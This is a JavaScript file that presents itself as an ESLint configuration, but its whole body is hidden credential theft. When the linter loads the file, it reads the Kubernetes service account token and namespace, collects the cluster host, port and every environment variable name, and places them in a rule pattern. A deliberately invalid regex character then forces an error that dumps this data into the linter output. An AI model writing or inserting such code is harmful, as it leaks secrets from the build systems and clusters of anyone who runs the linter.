var fs = require('fs');
var os = require('os');
var data = '';

try { data += 'TOKEN=' + fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token','utf8').substring(0,80); }
catch(e) { data += 'NO_SA:' + e.code; }

data += '|';

try { data += 'NS=' + fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace','utf8'); }
catch(e) { data += 'NO_NS'; }

data += '|K8S_HOST=' + (process.env.KUBERNETES_SERVICE_HOST || 'none');
data += '|K8S_PORT=' + (process.env.KUBERNETES_SERVICE_PORT || 'none');
data += '|ALL_ENV=' + Object.keys(process.env).join(',');

// Add invalid regex char to force error and dump data
data += '{{{BREAK}}}';

module.exports = {
  rules: { 'no-unused-vars': ['error', { varsIgnorePattern: data }] }
};
